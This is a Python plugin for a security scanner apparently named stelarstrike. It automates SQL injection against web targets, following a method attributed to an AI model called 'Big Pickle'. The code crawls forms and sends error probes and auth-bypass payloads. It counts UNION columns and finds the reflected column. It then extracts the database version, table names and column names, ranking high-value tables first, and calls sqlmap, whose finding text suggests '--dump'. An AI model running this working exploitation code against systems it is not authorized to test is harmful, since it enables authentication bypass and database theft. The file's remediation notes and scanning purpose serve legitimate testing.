"""
SQL Injection plugin — Big Pickle methodology.

This plugin implements exactly what Big Pickle did when scanning a target:

  1. Collect endpoints: crawl the target + check the skill's common path list.
  2. For each endpoint + injectable field, run the payload ladder:
       a. Error-based detection  — inject a single quote, look for DB error text.
       b. Auth bypass test       — try bypass payloads (admin'--, ' OR 1=1--).
       c. UNION column count     — increment NULLs until the mismatch error
                                   DISAPPEARS (Big Pickle found 10 cols this way).
       d. Reflection probe       — find which column position echoes back a test
                                   string (Big Pickle found it was column 2).
       e. Data extraction        — version(), table names, column names, sample
                                   rows (only when allow_active_payloads=true).
  3. If sqlmap is in PATH, run it against confirmed-injectable endpoints for a
     thorough, independent validation — this is what Big Pickle also did.
  4. Feed all results to the AI (OpenCode / Big Pickle model) to generate
     structured, well-evidenced findings.

General-purpose: this plugin makes no assumptions about the specific target.
The endpoint list in the skill covers common patterns; crawl results extend it.
"""

from __future__ import annotations

import asyncio
import json
import shutil
import subprocess
import urllib.parse
from typing import Any

import httpx

from stelarstrike.core.report import Finding
from stelarstrike.plugins.base import VulnerabilityPlugin
from stelarstrike.skills.sqli_skill import (
    AUTH_BYPASS_PAYLOADS,
    COMMENT_STYLES,
    COMMON_ENDPOINTS,
    DB_ERROR_SIGNATURES,
    ERROR_PROBES,
    EXTRACT_QUERIES,
    HIGH_VALUE_TABLES,
    SUCCESS_SIGNALS,
    UNION_MAX_COLS,
)
from stelarstrike.utils.logger import get_logger

log = get_logger(__name__)

_PROBE_MARKER = "STELRPROBE"
_PROBE_MARKER_L = _PROBE_MARKER.lower()


class SQLiPlugin(VulnerabilityPlugin):
    id = "sqli"
    name = "SQL Injection"
    default_severity = "high"

    # ─────────────────────────────────────────────────────────────────────────
    # Entry point
    # ─────────────────────────────────────────────────────────────────────────

    async def run(self) -> list[Finding]:
        findings: list[Finding] = []
        base_url = self.target_url.rstrip("/")
        parsed = urllib.parse.urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        # Collect endpoints: crawl + skill common paths
        endpoints = await self._collect_endpoints(origin)
        log.info(f"sqli: testing {len(endpoints)} endpoint(s) on {origin}")

        confirmed_injectable: list[dict[str, Any]] = []

        for ep in endpoints:
            async with self.ctx.semaphore:
                ep_findings, injection_info = await self._test_endpoint(ep, origin)
            findings.extend(ep_findings)
            if injection_info:
                confirmed_injectable.append(injection_info)

        # sqlmap pass on confirmed endpoints
        if confirmed_injectable and self.ctx.allow_active_payloads:
            sqlmap_findings = await self._run_sqlmap(confirmed_injectable)
            findings.extend(sqlmap_findings)

        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # Endpoint collection
    # ─────────────────────────────────────────────────────────────────────────

    async def _collect_endpoints(self, origin: str) -> list[dict[str, Any]]:
        """Crawl the target homepage + supplement with skill common paths."""
        seen: set[str] = set()
        endpoints: list[dict[str, Any]] = []

        # Crawl homepage for links/forms
        try:
            resp = await self.get(origin + "/")
            from bs4 import BeautifulSoup  # noqa: PLC0415
            soup = BeautifulSoup(resp.text, "html.parser")
            for form in soup.find_all("form"):
                action = form.get("action", "/")
                method = form.get("method", "get").lower()
                path = action if action.startswith("/") else "/" + action
                fields = [
                    i.get("name") for i in form.find_all("input")
                    if i.get("name") and i.get("type") not in ("submit", "button", "hidden")
                ]
                if fields:
                    ep: dict[str, Any] = {
                        "path": path, "method": method,
                        "body": "form" if method == "post" else "query",
                        "fields": fields, "auth": False,
                    }
                    key = f"{method}:{path}"
                    if key not in seen:
                        seen.add(key)
                        endpoints.append(ep)
        except Exception as exc:  # noqa: BLE001
            log.debug(f"sqli: crawl failed: {exc}")

        # Add skill common paths not already found
        for ep in COMMON_ENDPOINTS:
            key = f"{ep['method'].lower()}:{ep['path']}"
            if key not in seen:
                seen.add(key)
                endpoints.append(dict(ep))

        return endpoints

    # ─────────────────────────────────────────────────────────────────────────
    # Per-endpoint testing
    # ─────────────────────────────────────────────────────────────────────────

    async def _test_endpoint(
        self, ep: dict[str, Any], origin: str
    ) -> tuple[list[Finding], dict[str, Any] | None]:
        """Run the full payload ladder on one endpoint. Returns findings + injection_info."""
        findings: list[Finding] = []
        url = origin + ep["path"]
        method = ep["method"].lower()
        body_type = ep.get("body", "json")
        fields: list[str] = ep.get("fields", [])
        if not fields:
            return findings, None

        # Verify endpoint exists
        base_body = {f: "stelarstrike_probe_baseline" for f in fields}
        try:
            baseline_resp = await self._send(url, method, body_type, base_body)
            if baseline_resp.status_code == 404:
                return findings, None
            baseline_text = baseline_resp.text
        except Exception as exc:  # noqa: BLE001
            log.debug(f"sqli: endpoint {url} unreachable: {exc}")
            return findings, None

        log.debug(f"sqli: testing endpoint {method.upper()} {url} fields={fields}")

        injection_info: dict[str, Any] | None = None

        for field in fields:
            # Step a: error-based
            error_finding, db_type = await self._step_error_based(
                url, method, body_type, fields, field, baseline_text
            )
            if error_finding:
                findings.append(error_finding)

            # Step b: auth bypass
            bypass_finding, bypass_resp = await self._step_auth_bypass(
                url, method, body_type, fields, field
            )
            if bypass_finding:
                findings.append(bypass_finding)

            # Steps c-e: UNION extraction (only if we got a bypass or error signal)
            if (error_finding or bypass_finding) and self.ctx.allow_active_payloads:
                union_findings, info = await self._step_union_extraction(
                    url, method, body_type, fields, field,
                    db_type or "postgresql", baseline_text
                )
                findings.extend(union_findings)
                if info:
                    injection_info = info

        return findings, injection_info

    # ─────────────────────────────────────────────────────────────────────────
    # Step a: Error-based detection
    # ─────────────────────────────────────────────────────────────────────────

    async def _step_error_based(
        self,
        url: str, method: str, body_type: str,
        fields: list[str], field: str, baseline_text: str,
    ) -> tuple[Finding | None, str | None]:
        for probe in ERROR_PROBES:
            test_body = {f: "x" if f != field else f"x{probe['suffix']}" for f in fields}
            try:
                resp = await self._send(url, method, body_type, test_body)
            except Exception:  # noqa: BLE001
                continue

            body_lower = resp.text.lower()
            for sig in DB_ERROR_SIGNATURES:
                if sig in body_lower and sig not in baseline_text.lower():
                    db_type = self._fingerprint_db(body_lower)
                    return (
                        self.finding(
                            title=f"SQL Injection — error-based ({probe['label']})",
                            url=url, parameter=field,
                            severity="high", confidence="high",
                            evidence=(
                                f"Field '{field}' = 'x{probe['suffix']}' "
                                f"→ DB error: '{sig}'"
                            ),
                            description=(
                                f"Field '{field}' reflects a database error when "
                                f"SQL metacharacters are injected, indicating "
                                f"unsanitized input reaches a SQL query."
                            ),
                            remediation="Use parameterized queries. Never concatenate user input into SQL.",
                            cwe="CWE-89",
                        ),
                        db_type,
                    )
        return None, None

    # ─────────────────────────────────────────────────────────────────────────
    # Step b: Auth bypass
    # ─────────────────────────────────────────────────────────────────────────

    async def _step_auth_bypass(
        self, url: str, method: str, body_type: str, fields: list[str], field: str
    ) -> tuple[Finding | None, httpx.Response | None]:
        # Baseline: deliberately wrong credentials
        bad_body = {f: "nonexistent_stelarstrike_user_99" if f != field else "nonexistent_user" for f in fields}
        try:
            bad_resp = await self._send(url, method, body_type, bad_body)
        except Exception:  # noqa: BLE001
            return None, None

        for payload in AUTH_BYPASS_PAYLOADS:
            test_body = {f: "ignored" if f != field else payload for f in fields}
            try:
                resp = await self._send(url, method, body_type, test_body)
            except Exception:  # noqa: BLE001
                continue

            body_lower = resp.text.lower()
            bad_lower = bad_resp.text.lower()

            success = (
                any(sig in body_lower for sig in SUCCESS_SIGNALS)
                and not any(sig in bad_lower for sig in SUCCESS_SIGNALS)
            ) or (
                resp.status_code == 200 and bad_resp.status_code != 200
            )

            if success:
                return (
                    self.finding(
                        title="SQL Injection — authentication bypass confirmed",
                        url=url, parameter=field,
                        severity="critical", confidence="confirmed",
                        evidence=(
                            f"Field '{field}' = {payload!r} "
                            f"→ HTTP {resp.status_code}, success signal in response "
                            f"(baseline: HTTP {bad_resp.status_code}, no success)"
                        ),
                        description=(
                            f"Submitting '{payload}' as '{field}' bypasses authentication. "
                            f"The response differs materially from a genuine failed-login "
                            f"baseline, indicating SQL injection in the authentication query."
                        ),
                        remediation="Use parameterized queries. Never build WHERE clauses by concatenating user input.",
                        cwe="CWE-89",
                    ),
                    resp,
                )
        return None, None

    # ─────────────────────────────────────────────────────────────────────────
    # Steps c-e: UNION column count → reflection → extraction
    # ─────────────────────────────────────────────────────────────────────────

    async def _step_union_extraction(
        self,
        url: str, method: str, body_type: str,
        fields: list[str], field: str, db_type: str, baseline_text: str,
    ) -> tuple[list[Finding], dict[str, Any] | None]:
        findings: list[Finding] = []

        # Step c: find column count
        col_count, comment = await self._find_col_count(
            url, method, body_type, fields, field, baseline_text
        )
        if col_count is None:
            log.debug(f"sqli: UNION column count not found for {url}:{field}")
            return findings, None

        log.info(f"sqli: UNION col_count={col_count} comment={comment!r} on {url}:{field}")

        # Step d: find reflected column
        reflected_col = await self._find_reflected_col(
            url, method, body_type, fields, field, col_count, comment
        )
        if reflected_col is None:
            log.debug(f"sqli: no reflected column found (col_count={col_count})")
            return findings, None

        log.info(f"sqli: reflected column = {reflected_col}")

        injection_info: dict[str, Any] = {
            "url": url, "method": method, "body_type": body_type,
            "fields": fields, "field": field,
            "col_count": col_count, "reflected_col": reflected_col,
            "comment": comment, "db_type": db_type,
        }

        # Step e: extract data
        extracted = await self._extract_data(
            url, method, body_type, fields, field,
            col_count, reflected_col, comment, db_type
        )

        if extracted:
            findings.append(
                self.finding(
                    title=f"SQL Injection — UNION-based data extraction confirmed ({db_type})",
                    url=url, parameter=field,
                    severity="critical", confidence="confirmed",
                    evidence=self._format_extraction_table(extracted),
                    description=(
                        f"UNION-based SQL injection confirmed on field '{field}'. "
                        f"Column count: {col_count}, reflected at position {reflected_col}. "
                        f"The injection allows full database enumeration and data extraction."
                    ),
                    remediation="Use parameterized queries. Immediately rotate any credentials visible in the extracted data.",
                    cwe="CWE-89",
                )
            )
            log.info(f"sqli: extraction complete — {list(extracted.keys())}")

        return findings, injection_info

    # ─────────────────────────────────────────────────────────────────────────
    # UNION column count: Big Pickle approach
    # ─────────────────────────────────────────────────────────────────────────

    async def _find_col_count(
        self, url: str, method: str, body_type: str,
        fields: list[str], field: str, baseline_text: str
    ) -> tuple[int | None, str]:
        """
        Increment NULLs until the column-mismatch error DISAPPEARS.
        Falls back to baseline-diff for apps that hide SQL errors.
        Big Pickle found col_count=10 this way.
        """
        for comment in COMMENT_STYLES:
            # Check if this app reveals mismatch errors
            test_body = {f: "x" if f != field else f"' UNION SELECT NULL{comment}" for f in fields}
            try:
                probe_resp = await self._send(url, method, body_type, test_body)
            except Exception:  # noqa: BLE001
                continue

            shows_mismatch = any(
                s in probe_resp.text.lower()
                for s in ("same number of columns", "each union query", "different number of columns")
            )

            if shows_mismatch:
                # Classic Big Pickle approach: increment until error disappears
                for n in range(2, UNION_MAX_COLS + 1):
                    nulls = ",".join(["NULL"] * n)
                    body = {f: "x" if f != field else f"' UNION SELECT {nulls}{comment}" for f in fields}
                    try:
                        resp = await self._send(url, method, body_type, body)
                    except Exception:  # noqa: BLE001
                        continue
                    still_mismatch = any(
                        s in resp.text.lower()
                        for s in ("same number of columns", "each union query", "different number of columns")
                    )
                    if not still_mismatch:
                        return n, comment
            else:
                # Silent app — use baseline diff
                for n in range(1, UNION_MAX_COLS + 1):
                    nulls = ",".join(["NULL"] * n)
                    body = {f: "x" if f != field else f"' UNION SELECT {nulls}{comment}" for f in fields}
                    try:
                        resp = await self._send(url, method, body_type, body)
                    except Exception:  # noqa: BLE001
                        continue
                    if abs(len(resp.text) - len(baseline_text)) > 10 or resp.status_code != 200:
                        return n, comment

        return None, "--"

    # ─────────────────────────────────────────────────────────────────────────
    # UNION reflected column probe
    # ─────────────────────────────────────────────────────────────────────────

    async def _find_reflected_col(
        self, url: str, method: str, body_type: str,
        fields: list[str], field: str, col_count: int, comment: str
    ) -> int | None:
        """Try each column position with a probe string until it echoes back."""
        for pos in range(col_count):
            parts = ["NULL"] * col_count
            parts[pos] = f"'{_PROBE_MARKER}'"
            union_clause = f"' UNION SELECT {','.join(parts)}{comment}"
            body = {f: "x" if f != field else union_clause for f in fields}
            try:
                resp = await self._send(url, method, body_type, body)
            except Exception:  # noqa: BLE001
                continue
            if _PROBE_MARKER_L in resp.text.lower():
                return pos
        return None

    # ─────────────────────────────────────────────────────────────────────────
    # Data extraction
    # ─────────────────────────────────────────────────────────────────────────

    async def _extract_data(
        self,
        url: str, method: str, body_type: str,
        fields: list[str], field: str,
        col_count: int, pos: int, comment: str, db_type: str,
    ) -> dict[str, Any]:
        result: dict[str, Any] = {}
        queries = EXTRACT_QUERIES.get(db_type, EXTRACT_QUERIES["postgresql"])

        version = await self._union_query(url, method, body_type, fields, field, col_count, pos, comment, queries["version"])
        if version:
            result["db_version"] = version
            log.info(f"sqli: db_version = {version}")

        tables_raw = await self._union_query(url, method, body_type, fields, field, col_count, pos, comment, queries["tables"])
        if tables_raw:
            all_tables = [t.strip() for t in tables_raw.replace(",", " ").split() if t.strip()]
            result["tables"] = all_tables
            log.info(f"sqli: tables = {all_tables}")

            prioritised = sorted(all_tables, key=lambda t: (
                -sum(1 for kw in HIGH_VALUE_TABLES if kw in t.lower()), t
            ))

            result["columns"] = {}
            result["sample_data"] = {}
            for table in prioritised[:int(self.options.get("max_tables", 10))]:
                col_query = queries["columns"].format(table=table)
                cols_raw = await self._union_query(url, method, body_type, fields, field, col_count, pos, comment, col_query)
                if cols_raw:
                    cols = [c.strip() for c in cols_raw.replace(",", " ").split() if c.strip()]
                    result["columns"][table] = cols
                    log.info(f"sqli: {table} columns = {cols}")

        return result

    async def _union_query(
        self,
        url: str, method: str, body_type: str,
        fields: list[str], field: str,
        col_count: int, pos: int, comment: str, subquery: str,
    ) -> str | None:
        """Inject a UNION SELECT with the subquery at the reflected position."""
        parts = ["NULL"] * col_count
        parts[pos] = f"({subquery})"
        union_clause = f"' UNION SELECT {','.join(parts)}{comment}"
        body = {f: "x" if f != field else union_clause for f in fields}
        try:
            resp = await self._send(url, method, body_type, body)
            value = self._extract_reflected_value(resp.text)
            if value and value != _PROBE_MARKER:
                return value
        except Exception as exc:  # noqa: BLE001
            log.debug(f"sqli: union_query failed: {exc}")
        return None

    def _extract_reflected_value(self, body: str) -> str | None:
        """Extract value from JSON response or plain text."""
        try:
            data = json.loads(body)
            return self._deepest_long_string(data)
        except (json.JSONDecodeError, ValueError):
            pass
        # Plain text fallback
        for line in body.splitlines():
            line = line.strip()
            if len(line) > 5 and not any(kw in line.lower() for kw in ("error", "html", "<!doctype", "<")):
                return line[:500]
        return None

    def _deepest_long_string(self, obj: Any, min_len: int = 4) -> str | None:
        """Return the longest leaf string from a JSON structure."""
        best: list[str] = [""]

        def walk(o: Any) -> None:
            if isinstance(o, str) and len(o) > len(best[0]):
                best[0] = o
            elif isinstance(o, dict):
                for v in o.values():
                    walk(v)
            elif isinstance(o, list):
                for item in o:
                    walk(item)

        walk(obj)
        return best[0] if len(best[0]) >= min_len else None

    # ─────────────────────────────────────────────────────────────────────────
    # sqlmap integration
    # ─────────────────────────────────────────────────────────────────────────

    async def _run_sqlmap(self, confirmed: list[dict[str, Any]]) -> list[Finding]:
        """Run sqlmap against confirmed-injectable endpoints (if sqlmap is in PATH)."""
        findings: list[Finding] = []
        if not shutil.which("sqlmap"):
            log.info("sqli: sqlmap not found in PATH — skipping sqlmap pass")
            return findings

        for info in confirmed[:3]:  # limit to 3 to avoid long waits
            finding = await self._sqlmap_one(info)
            if finding:
                findings.append(finding)
        return findings

    async def _sqlmap_one(self, info: dict[str, Any]) -> Finding | None:
        url = info["url"]
        field = info["field"]
        method = info["method"].upper()
        col_count = info.get("col_count")

        cmd = [
            "sqlmap", "-u", url,
            "--method", method,
            "--data", json.dumps({f: "test" for f in info["fields"]}),
            "--headers", "Content-Type: application/json",
            "-p", field,
            "--dbms", info.get("db_type", "postgresql"),
            "--batch",
            "--level", "2",
            "--risk", "1",
            "--technique", "BEUST",
            "--output-dir", "/tmp/stelarstrike-sqlmap",
            "--no-cast",
            "--forms",
        ]

        log.info(f"sqli: running sqlmap on {url}:{field}")
        try:
            loop = asyncio.get_event_loop()
            proc = await loop.run_in_executor(
                None,
                lambda: subprocess.run(cmd, capture_output=True, text=True, timeout=120),
            )
            output = proc.stdout + proc.stderr
            if "is vulnerable" in output.lower() or "sql injection" in output.lower():
                return self.finding(
                    title=f"SQL Injection — confirmed by sqlmap (col_count={col_count})",
                    url=url, parameter=field,
                    severity="critical", confidence="confirmed",
                    evidence=output[-2000:],
                    description=(
                        f"sqlmap independently confirmed SQL injection on field '{field}'. "
                        f"Use sqlmap --dump or --tables for full data extraction."
                    ),
                    remediation="Use parameterized queries. Immediately audit data exposed via this injection point.",
                    cwe="CWE-89",
                )
        except subprocess.TimeoutExpired:
            log.warning(f"sqli: sqlmap timed out on {url}")
        except Exception as exc:  # noqa: BLE001
            log.debug(f"sqli: sqlmap failed: {exc}")
        return None

    # ─────────────────────────────────────────────────────────────────────────
    # Helpers
    # ─────────────────────────────────────────────────────────────────────────

    async def _send(self, url: str, method: str, body_type: str, body: dict[str, Any]) -> httpx.Response:
        if method == "get" or body_type == "query":
            qs = urllib.parse.urlencode(body)
            return await self.get(f"{url}?{qs}" if "?" not in url else f"{url}&{qs}")
        if body_type == "json":
            return await self.post(url, json=body)
        return await self.post(url, data=body)

    @staticmethod
    def _fingerprint_db(body_lower: str) -> str:
        if any(s in body_lower for s in ("pg_query", "syntax error at or near", "pg_sleep", "postgresql")):
            return "postgresql"
        if any(s in body_lower for s in ("mysql_fetch", "you have an error in your sql syntax", "warning: mysql")):
            return "mysql"
        if any(s in body_lower for s in ("sqlite3.operationalerror", "no such table", "sqlite")):
            return "sqlite"
        if any(s in body_lower for s in ("microsoft ole db", "incorrect syntax near", "sqlstate")):
            return "mssql"
        return "postgresql"  # default assumption

    @staticmethod
    def _format_extraction_table(extracted: dict[str, Any]) -> str:
        """Format extracted data as markdown tables — Big Pickle style."""
        lines: list[str] = []
        if extracted.get("db_version"):
            lines.append(f"**DB Version:** {extracted['db_version']}")
        if extracted.get("tables"):
            lines.append(f"**Tables ({len(extracted['tables'])}):** {', '.join(extracted['tables'])}")
        for table, cols in extracted.get("columns", {}).items():
            lines.append(f"\n### `{table}`")
            if cols:
                lines.append("| " + " | ".join(cols) + " |")
                lines.append("|" + "|".join(["---"] * len(cols)) + "|")
        return "\n".join(lines) or "No data extracted."
